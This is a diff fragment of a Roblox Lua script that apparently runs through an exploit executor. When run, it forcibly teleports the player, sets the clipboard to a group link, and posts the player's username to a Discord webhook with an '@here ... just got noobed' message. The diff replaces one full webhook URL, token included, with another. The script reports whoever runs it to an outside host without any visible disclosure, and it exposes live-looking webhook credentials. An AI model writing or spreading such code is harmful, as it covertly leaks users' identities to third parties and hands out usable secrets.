@@ -83,7 +83,7 @@ end
   local PlaceId = 5373028495
 game:GetService("TeleportService"):Teleport(PlaceId, game:GetService("Players").LocalPlayer)
 local msg = "@here " .. game.Players.LocalPlayer.Name .. " just got noobed."
-local url = "https://discord.com/api/webhooks/1038252815434383480/3CkB1JSaFYg7oNg8p_Zk10rbilN0KrX_VlNQ_mM9Zx_23u7Nrp5F_FN-5OBRCM_B7OGi"
+local url = "https://discord.com/api/webhooks/1039299929270652999/m_lVLl79Fbwt51bmV9TyCnbPeXZwPp2tBhylcMiUitdzjZTLs3M-f9Wi15s1bC-tyIpP"
 
 syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
       setclipboard(grouplink)
